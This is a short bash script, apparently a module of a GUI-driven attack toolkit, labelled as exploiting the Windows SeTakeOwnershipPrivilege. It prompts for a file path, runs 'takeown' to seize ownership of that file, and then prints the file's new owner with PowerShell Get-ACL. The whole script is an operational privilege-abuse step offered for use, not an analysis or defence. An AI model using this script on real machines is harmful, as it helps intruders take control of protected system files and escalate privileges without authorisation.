#!/bin/bash

: '
exploit SeTakeOwnershipPrivilege permission
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
FILE_FIELD=$(form_item  "File" "file")

# Generate GUI form
generate_form "${FILE_FIELD}"

FILE=${form_data["file"]}

execute_command "takeown /f '${FILE}'"
create_new_line
sleep 2

execute_command "Get-ChildItem -Path '${FILE}' | select name,directory, @{Name="Owner";Expression={(Get-ACL \$_.Fullname).Owner}}"
create_new_line
